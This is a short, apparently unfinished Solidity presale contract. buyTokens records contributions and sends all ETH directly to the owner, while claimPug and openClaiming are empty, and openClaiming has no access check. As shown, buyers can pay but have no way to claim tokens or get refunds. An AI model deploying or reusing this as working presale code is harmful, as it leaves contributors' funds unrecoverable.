pragma solidity ^0.8.0;

contract pugPresale {
    address public contractOwner;
    mapping(address => uint256) public walletBalances;

    constructor() {
        contractOwner = msg.sender;
    }

    function buyTokens(address _contributor) external payable {

        uint256 amount = msg.value;
        walletBalances[_contributor] += amount;
        payable(contractOwner).transfer(amount);
    }

    function claimPug() external  {
      
    }

    function openClaiming() external {
      
    }
}